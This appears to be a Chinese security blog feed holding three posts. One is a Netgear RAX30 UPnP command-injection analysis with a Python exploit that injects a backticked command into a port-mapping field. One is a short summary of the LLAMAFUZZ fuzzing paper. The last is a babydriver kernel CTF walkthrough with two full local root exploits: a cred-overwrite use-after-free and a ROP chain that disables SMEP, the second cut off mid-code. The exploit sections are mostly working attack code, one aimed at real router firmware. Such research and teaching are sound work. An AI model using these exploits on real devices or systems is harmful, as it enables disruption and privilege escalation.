<p>因为该漏洞影响版本为<strong>Up to (excluding) 1.0.11.96_2_hotfix</strong>。可以发现供应商发布了hotfix进行紧急修复，因此可以对照1.0.11.96_2_hotfix和比较接近的1.0.10.94_3两个版本进行diff。</p>
<p>选择upnp程序进行diff</p>
<img src="/posts/a9bcbbe9/upload_5053ef8c7f4d71782822be6c6fbd21c2.png" class="">


<p>发现有一个函数相似度较低，分析该函数：</p>
<img src="/posts/a9bcbbe9/upload_1f1783fe283679ad5cd831ae0097b3d5.png" class="">


<p>主要的改动为在开头接受upnp_updateOrAddPortMapping_dev2参数内容时添加了正则表达式匹配逻辑，检测a8,a9参数是否合法，因此怀疑漏洞为a8,a9参数内容为用户可控。</p>
<p>回溯上层调用，为v6变量</p>
<img src="/posts/a9bcbbe9/upload_9439d4a4fd202c3d6b3b8ed2db92e23c.png" class="">


<p>继续上溯，发现为结构体，应该为函数表，该函数对应<code>AddPortMapping</code>功能</p>
<img src="/posts/a9bcbbe9/image-20250521174824025.png" class="" title="image-20250521174824025">

<p>以上结构体格式如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AddPortMapping</span> &#123;</span></span><br><span class="line">    <span class="type">char</span>* func_name;</span><br><span class="line">    INT32 func_ptr;</span><br><span class="line">    func_arg* args_list;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">func_arg</span> &#123;</span></span><br><span class="line">    <span class="type">char</span>* arg_name;</span><br><span class="line">    <span class="type">char</span> arg_idx[<span class="number">0xc</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="sink点分析"><a href="#sink点分析" class="headerlink" title="sink点分析"></a>sink点分析</h3><p>应该是<code>libcms_core.so</code>文件的<code>rutIpt_portforwardRunIptables</code>函数（感觉这个更有可能一些）<br>sink点函数调用链：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rcl_dev2IpInterfaceObject</span><br><span class="line">    |</span><br><span class="line">    V</span><br><span class="line">   ...</span><br><span class="line">    |</span><br><span class="line">    V</span><br><span class="line">rutIpt_initNat</span><br><span class="line">    |</span><br><span class="line">    V</span><br><span class="line">rutIpt_activatePortMappingEntries_dev2</span><br><span class="line">    |</span><br><span class="line">    V</span><br><span class="line">rutIpt_portforwardCfg_dev2</span><br><span class="line">    |</span><br><span class="line">    V</span><br><span class="line">rutIpt_portforwardRunIptables</span><br><span class="line">    |</span><br><span class="line">    V</span><br><span class="line">rut_doSystemAction</span><br></pre></td></tr></table></figure>
<img src="/posts/a9bcbbe9/upload_bb3bb082eff66fc5f4d68a30837f78df.png" class="">

<p>doSystemAction函数内容如下，可以看到是会执行a2参数命令。</p>
<img src="/posts/a9bcbbe9/upload_d8d2d7a362d85a5faa16f50e1bf17785.png" class="">

<h2 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h2><p>编写upnp交互程序，修改其InternelClient参数内容为注入命令。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># $Id: testupnpigd.py,v 1.7 2020/04/06 10:23:02 nanard Exp $</span></span><br><span class="line"><span class="comment"># MiniUPnP project</span></span><br><span class="line"><span class="comment"># Author : Thomas Bernard</span></span><br><span class="line"><span class="comment"># This Sample code is public domain.</span></span><br><span class="line"><span class="comment"># website : https://miniupnp.tuxfamily.org/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># import the python miniupnpc module</span></span><br><span class="line"><span class="keyword">import</span> miniupnpc</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="keyword">from</span> BaseHTTPServer <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"></span><br><span class="line"><span class="comment"># function definition</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_redirections</span>():</span><br><span class="line">	i = <span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		p = u.getgenericportmapping(i)</span><br><span class="line">		<span class="keyword">if</span> p==<span class="literal">None</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="built_in">print</span>(i, p)</span><br><span class="line">		i = i + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create the object</span></span><br><span class="line">u = miniupnpc.UPnP()</span><br><span class="line"><span class="comment">#print &#x27;inital(default) values :&#x27;</span></span><br><span class="line"><span class="comment">#print &#x27; discoverdelay&#x27;, u.discoverdelay</span></span><br><span class="line"><span class="comment">#print &#x27; lanaddr&#x27;, u.lanaddr</span></span><br><span class="line"><span class="comment">#print &#x27; multicastif&#x27;, u.multicastif</span></span><br><span class="line"><span class="comment">#print &#x27; minissdpdsocket&#x27;, u.minissdpdsocket</span></span><br><span class="line">u.discoverdelay = <span class="number">200</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;Discovering... delay=%ums&#x27;</span> % u.discoverdelay)</span><br><span class="line">	ndevices = u.discover()</span><br><span class="line">	<span class="built_in">print</span>(ndevices, <span class="string">&#x27;device(s) detected&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># select an igd</span></span><br><span class="line">	u.selectigd()</span><br><span class="line">	<span class="comment"># display information about the IGD and the internet connection</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;local ip address :&#x27;</span>, u.lanaddr)</span><br><span class="line">	externalipaddress = u.externalipaddress()</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;external ip address :&#x27;</span>, externalipaddress)</span><br><span class="line">	<span class="built_in">print</span>(u.statusinfo(), u.connectiontype())</span><br><span class="line"></span><br><span class="line">	<span class="comment"># find a free port for the redirection</span></span><br><span class="line">	r = u.getspecificportmapping(<span class="number">11111</span>, <span class="string">&#x27;TCP&#x27;</span>)</span><br><span class="line">	eport = <span class="number">11111</span></span><br><span class="line">	<span class="keyword">while</span> r != <span class="literal">None</span> <span class="keyword">and</span> eport &lt; <span class="number">65536</span>:</span><br><span class="line">		eport = eport + <span class="number">1</span></span><br><span class="line">		r = u.getspecificportmapping(eport, <span class="string">&#x27;TCP&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;trying to redirect %s port %u TCP =&gt; %s port %u TCP&#x27;</span> % (externalipaddress, eport, u.lanaddr, <span class="number">11111</span>))</span><br><span class="line"></span><br><span class="line">	b = u.addportmapping(eport, <span class="string">&#x27;TCP&#x27;</span>, <span class="string">&#x27;`reboot`&#x27;</span>, <span class="number">11111</span>,</span><br><span class="line">	                    <span class="string">&#x27;UPnP IGD Tester port %u&#x27;</span> % eport, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span> b:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;Success. Now waiting for some HTTP request on http://%s:%u&#x27;</span> % (externalipaddress ,eport))</span><br><span class="line">		<span class="comment"># b = u.deleteportmapping(eport, &#x27;TCP&#x27;)</span></span><br><span class="line">		<span class="comment"># if b:</span></span><br><span class="line">		<span class="comment"># 	print(&#x27;Successfully deleted port mapping&#x27;)</span></span><br><span class="line">		<span class="comment"># else:</span></span><br><span class="line">		<span class="comment"># 	print(&#x27;Failed to remove port mapping&#x27;)</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;Failed&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;Exception :&#x27;</span>, e)</span><br></pre></td></tr></table></figure>
<p>尝试telnetd、ping等命令无效，使用reboot命令，成功使设备重启。<br>不过发现命令注入参数为”NewInternalClient”。<br>使用修复后的尝试：</p>
<img src="/posts/a9bcbbe9/upload_79fafa157e08258075b185ddb5801863.png" class="">



<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>下载最新固件：<a href="https://www.netgear.com/support/product/rax30/#download">Netgear RAX30-V1.0.14.108_1</a></p>
<h3 id="反汇编恢复符号"><a href="#反汇编恢复符号" class="headerlink" title="反汇编恢复符号"></a>反汇编恢复符号</h3><p>静态分析发现其中很多函数都存在调试信息，因此可以考虑使用ida脚本自动化恢复。</p>


]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>LLAMAFUZZ论文阅读</title>
    <url>/posts/2a47a59b.html</url>
    <content><![CDATA[<p>LLAMAFUZZ：通过对大模型进行微调让大模型获得生成以及变异结构化数据的能力，从而解决模糊测试中难以生成相关合法输入的问题。</p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><strong>目标对象</strong>：开源库，结构化数据（如PNG）</p>
<p><strong>贡献</strong>：</p>
<ul>
<li>通过<strong>微调</strong>大模型可以实现对二进制数据和文本数据的变异策略加强。</li>
<li>使用大模型（优于通用大模型以及专用大模型），可以学习<strong>结构化数据</strong>种子模版以及进行变异</li>
<li>证明了这种方法的有效性</li>
</ul>
<p><strong>效果</strong>：</p>
<p>优于AFL++，相比于当前的主流Fuzzer在benchmark上可以多发现41个漏洞，同时代码覆盖率提高了27.19%</p>
<blockquote>
<p>论文里提到了Grammar-based fuzzing，其中输入格式由人工指定，变异策略分为三种：1）随机变异，随机选择一个非叶子节点（non-leaf non terminal node）为其添加子属性；2）随机递归展开，找到存在递归的规则并将其进行扩展；3）剪切，合并两个输入，确保语法正确</p>
</blockquote>
<h2 id="技术路线"><a href="#技术路线" class="headerlink" title="技术路线"></a>技术路线</h2><ol>
<li>训练数据收集（各种模糊测试数据，FuzzBench、AFL++）</li>
<li>使用结构化数据对来微调大模型</li>
<li>集成LLM进行fuzz（异步方法提高效率）</li>
</ol>
<img src="/posts/2a47a59b/image-20250425125617620.png" class="" title="image-20250425125617620">

<h3 id="训练数据收集"><a href="#训练数据收集" class="headerlink" title="训练数据收集"></a>训练数据收集</h3><p>基座：llama-2-7b-chat-hf  </p>
<p>微调数据：真实的模糊测试数据</p>
<ol>
<li>微调数据收集：从FuzzBench、AFL++中获取有价值的种子。标准：1）可以发现新的路径；2）hit-counts不同；3）触发crash</li>
<li>数据转换&amp;预处理：将二进制输入文件转换为16进制hex表示。原因：1）适用于多种类型数据；2）易于LLM理解；3）相较于base64等编码方式，hex效率要高一些。<img src="/posts/2a47a59b/image-20250425125719832.png" class="" title="image-20250425125719832"></li>
</ol>
<h3 id="微调大模型"><a href="#微调大模型" class="headerlink" title="微调大模型"></a>微调大模型</h3><img src="/posts/2a47a59b/image-20250425130501012.png" class="" title="image-20250425130501012">]]></content>
      <categories>
        <category>论文</category>
      </categories>
  </entry>
  <entry>
    <title>2025-05-16-CICSN_2017_babydriver学习</title>
    <url>/posts/5f22e5f4.html</url>
    <content><![CDATA[<p> PWN kernel入门题。</p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>题目地址：<a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/kernel/CISCN2017-babydriver/babydriver.tar">https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/kernel/CISCN2017-babydriver/babydriver.tar</a></p>
<p>解压后，文件目录结构如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ tree .</span><br><span class="line">.</span><br><span class="line">├── babydriver</span><br><span class="line">│   ├── boot.sh		# 启动脚本</span><br><span class="line">│   ├── bzImage		# 内核</span><br><span class="line">│   └── rootfs.cpio	# 文件系统</span><br><span class="line">├── babydriver.i64</span><br><span class="line">├── babydriver.ko	# 内核模块</span><br><span class="line">├── babydriver.tar</span><br><span class="line">├── cred			# cred exp</span><br><span class="line">├── cred.c</span><br><span class="line">├── tty_struct		# tty_struct exp</span><br><span class="line">└── tty_struct.c</span><br></pre></td></tr></table></figure>

<p>进入babydriver目录，直接运行<code>sudo ./boot.sh</code>即可把内核跑起来</p>
<blockquote>
<p>如果启动 boot.sh 失败，需要虚拟机开一下 <code>虚拟化 Intel VT-x/EPT 或 AMD-V/RVI</code>，开不了的话需要在 windows 下的管理员 cmd 窗口中执行 <code>bcdedit /set hypervisorlaunchtype off</code>，然后重启。</p>
</blockquote>
<p>查看.&#x2F;boot.sh内容，为qemu系统模拟命令，<code>-cpu kvm64,+smep</code>表示开启smep防护：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &#x27;console=ttyS0 root=/dev/r</span><br><span class="line">am oops=panic panic=1&#x27; -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,th</span><br><span class="line">reads=1 -cpu kvm64,+smep</span><br></pre></td></tr></table></figure>

<p>一些常见的内核防护：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">.</span> <span class="string">mesg</span> <span class="string">Restrictions：通过设置</span> <span class="string">/proc/sys/kernel/dmesg_restrict</span> <span class="string">为</span> <span class="number">1</span><span class="string">，可以将</span> <span class="string">dmesg</span> <span class="string">输出的信息视为敏感信息（默认为</span> <span class="number">0</span><span class="string">）</span></span><br><span class="line"><span class="number">2</span><span class="string">.</span> <span class="string">Kernel</span> <span class="string">Address</span> <span class="string">Display</span> <span class="string">Restriction：/proc/sys/kernel/kptr_restrict</span> <span class="string">被默认设置为</span> <span class="number">1</span><span class="string">，导致无法通过</span> <span class="string">/proc/kallsyms</span> <span class="string">获取内核地址</span></span><br><span class="line"><span class="number">3</span><span class="string">.</span> <span class="string">Kernel</span> <span class="string">PageTable</span> <span class="string">Isolation：KPTI，内核页表隔离，进程地址空间被分成了内核地址空间和用户地址空间，其中内核地址空间映射到了整个物理地址空间，而用户地址空间只能映射到指定的物理地址空间。内核地址空间和用户地址空间共用一个页全局目录表。为了彻底防止用户程序获取内核数据，可以令内核地址空间和用户地址空间使用两组页表集</span></span><br><span class="line"><span class="number">4</span><span class="string">.</span> <span class="string">Kernel</span> <span class="string">ASLR：内核地址空间布局随机化</span></span><br><span class="line"><span class="number">5</span><span class="string">.</span> <span class="string">SMEP（Supervisor</span> <span class="string">Mode</span> <span class="string">Execution</span> <span class="string">Protection</span> <span class="string">管理模式执行保护）：禁止CPU处于</span> <span class="string">ring0</span> <span class="string">模式时执行用户空间代码。</span></span><br><span class="line"><span class="number">6</span><span class="string">.</span> <span class="string">SMAP（Superivisor</span> <span class="string">Mode</span> <span class="string">Access</span> <span class="string">Protection</span> <span class="string">管理模式访问保护）：禁止内核CPU访问用户空间的数据。</span></span><br><span class="line"><span class="number">7</span><span class="string">.</span> <span class="string">Stack</span> <span class="string">Protector：和用户态相同，canary</span></span><br><span class="line"><span class="number">8</span><span class="string">.</span> <span class="string">Address</span> <span class="string">Protection：内核空间和用户空间共享虚拟内存地址，因此需要防止用户空间mmap</span> <span class="string">的内存从0开始，从而缓解空指针引用攻击。</span></span><br></pre></td></tr></table></figure>

<p>解包文件系统命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解包</span></span><br><span class="line">mv rootfs.cpio rootfs.cpio.gz</span><br><span class="line">gunzip rootfs.cpio.gz</span><br><span class="line">cpio -idmv &lt; rootfs.cpio</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打包</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解包后查看<code>init</code>文件内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ cat init</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>

<p>可以发现为创建仅root可读的flag文件，同时将babydriver.ko装载进内核。</p>
<p>需要利用存在漏洞的babydriver.ko进行内核提权，获得root权限。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>ida打开<code>babydriver.ko</code>文件：</p>
<p><strong>babydriver_init函数</strong>：</p>
<p>设备注册函数，可以看到向内核注册了babydev设备，其中有几个需要关注的函数：</p>
<ul>
<li>alloc_chrdev_region、device_create：设备注册函数，向内核注册babydev设备，设备文件默认位置为<code>/dev/</code>目录下</li>
<li>cdev_init：设备操作函数注册，定义了对设备操作的回调函数结构体<code>fops</code>。</li>
</ul>
<img src="/posts/5f22e5f4/image-20250516154123424.png" class="" title="image-20250516154123424">

<p>fops结构体内容如下：如果你对目标设备进行对应的系统调用，就会执行相应的回调函数</p>
<img src="/posts/5f22e5f4/image-20250516154534748.png" class="" title="image-20250516154534748">

<p><strong>babyopen函数</strong>：</p>
<p>调用<code>kmem_cache_alloc_trace</code>函数，申请kmem_cache，相当于内核的堆</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">kmem_cache_alloc_trace</span><span class="params">(<span class="keyword">struct</span> kmem_cache* cachep, <span class="type">gfp_t</span> flags, <span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure>

<img src="/posts/5f22e5f4/image-20250516170301345.png" class="" title="image-20250516170301345">

<p><strong>babyread函数</strong>：</p>
<p>调用了<code>copy_to_user</code>函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">copy_to_user</span><span class="params">(<span class="type">void</span> *to, <span class="type">const</span> <span class="type">void</span> *from, <span class="type">unsigned</span> <span class="type">long</span> n)</span>;</span><br></pre></td></tr></table></figure>

<p>函数功能相当于<code>memcpy</code>，将系统空间指针地址（from）复制到用户空间指针地址（to）：</p>
<img src="/posts/5f22e5f4/image-20250516165921651.png" class="" title="image-20250516165921651">

<p><strong>babywrite函数</strong>：</p>
<p>调用<code>copy_from_user</code>函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">copy_from_user</span><span class="params">(<span class="type">void</span> *to, <span class="type">const</span> <span class="type">void</span> *from, <span class="type">unsigned</span> <span class="type">long</span> n)</span>;</span><br></pre></td></tr></table></figure>

<p>相当于<code>memcpy</code>，将用户空间指针内容（from）复制到内核空间指针（to）</p>
<img src="/posts/5f22e5f4/image-20250517102155991.png" class="" title="image-20250517102155991">

<p><strong>babyioctl函数</strong>：</p>
<p>重新申请一个指定大小的<code>device_buf</code>.</p>
<img src="/posts/5f22e5f4/image-20250517102358417.png" class="" title="image-20250517102358417">

<p><strong>babyrelease函数</strong>：</p>
<p>调用<code>kfree</code>函数，但是没有清零，存在UAF漏洞。</p>
<img src="/posts/5f22e5f4/image-20250517102237141.png" class="" title="image-20250517102237141">

<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>linux内核提权方法：</p>
<ul>
<li><p>直接改进程的struct cred结构体（老版本内核可用）；</p>
<blockquote>
<p>kernel 4.4.72 时, cred 结构体没有专门的一个 kmem_cache (slub allocator) 来分配. struct cred 大小是 0xa8, 会使用 kmalloc-192 这个 kmem_cache 来分配. 而我们知道, cred 中保存了 uid, gid, 等, 如果可以改变这些, 那么就可以成功提权.</p>
<p>不过后续版本的 kernel 创建了一个 cred_jar 的 kmem_cache, 专门用来分配 cred, 而不是使用 kmalloc-192, 所以无法用这个 UAF 来直接修改 euid 了.</p>
</blockquote>
</li>
<li><p><code>commit_creds(prepare_kernel_cred(0))</code>（通用方法，也比较简单？）</p>
</li>
</ul>
<p>Linux系统为宏内核，内核模块加载到内核后可以访问内核空间的内存，如果同时打开两次<code>/dev/babydev</code>设备，两个进程指向的全局指针<code>babydev_struct</code>是同一个。如果同时打开两个，然后释放其中一个，会调用babyrelease函数将<code>babydev_struct</code>结构体释放，而此时另一个设备仍然可以继续访问该结构体，存在UAF。</p>
<p><strong>利用思路1</strong>：修改cred结构体</p>
<ol>
<li>同时打开两个设备，</li>
<li>使用ioctl修改<code>babydev_struct</code>结构体大小为<code>cred</code>结构体大小，</li>
<li>释放一个设备，</li>
<li>fork新进程，新进程的cred结构体会申请到释放的设备<code>babydev_struct</code>，此时未释放的进程仍可以修改新进程的cred结构体</li>
<li>修改cred结构体uid，guid，sgid、euid、egid为0，返回后创建shell即可实现提权。</li>
</ol>
<p>exp.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 打开两次设备</span></span><br><span class="line">	<span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)</span></span><br><span class="line">	ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0xa8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 释放 fd1</span></span><br><span class="line">	close(fd1);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 新起进程的 cred 空间会和刚刚释放的 babydev_struct 重叠</span></span><br><span class="line">	<span class="type">int</span> pid = fork();</span><br><span class="line">	<span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;[*] fork error!&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 通过更改 fd2，修改新进程的 cred 的 uid，gid 等值为0</span></span><br><span class="line">		<span class="type">char</span> zeros[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">		write(fd2, zeros, <span class="number">28</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;[+] root now.&quot;</span>);</span><br><span class="line">			system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		wait(<span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	close(fd2);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>利用思路2</strong>：ROP调用<code>commit_creds(prepare_kernel_cred(0))</code></p>
<p>使用UAF关闭SMEP防护，使用ret2usr提权。系统根据 cr4 寄存器的第 20 位判断是否开启 SMEP 保护，通常可以向 CR4 寄存器中写入 0x6f0 来关闭 SMEP。</p>
<ol>
<li>同时打开两个设备，</li>
<li>使用ioctl修改<code>babydev_struct</code>结构体大小为<code>tty_struct</code>结构体大小，</li>
<li>释放一个设备</li>
<li>打开<code>/dev/ptmx</code>获取到tty_struct，此时未释放的设备进程仍然可以修改tty_struct</li>
<li>修改tty_operations结构体为篡改后的结构体</li>
<li>使用write触发ROP（ROP逻辑为关闭SMEP，然后ret2usr获取root shell）</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prepare_kernel_cred_addr 0xffffffff810a1810</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> commit_creds_addr 0xffffffff810a1420</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* fake_tty_operations[<span class="number">30</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	__asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">			<span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">			<span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">			<span class="string">&quot;pushf;&quot;</span></span><br><span class="line">			<span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">			);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred_addr;</span><br><span class="line">    <span class="type">void</span> (*cc)(<span class="type">char</span>*) = commit_creds_addr;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810d238d</span>;		<span class="comment">// pop rdi; ret;</span></span><br><span class="line">    rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81004d80</span>;		<span class="comment">// mov cr4, rdi; pop rbp; ret;</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)get_root;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81063694</span>;		<span class="comment">// swapgs; pop rbp; ret;</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff814e35ef</span>;		<span class="comment">// iretq; ret;</span></span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)get_shell;</span><br><span class="line">    rop[i++] = user_cs;                <span class="comment">/* saved CS */</span></span><br><span class="line">    rop[i++] = user_rflags;            <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span 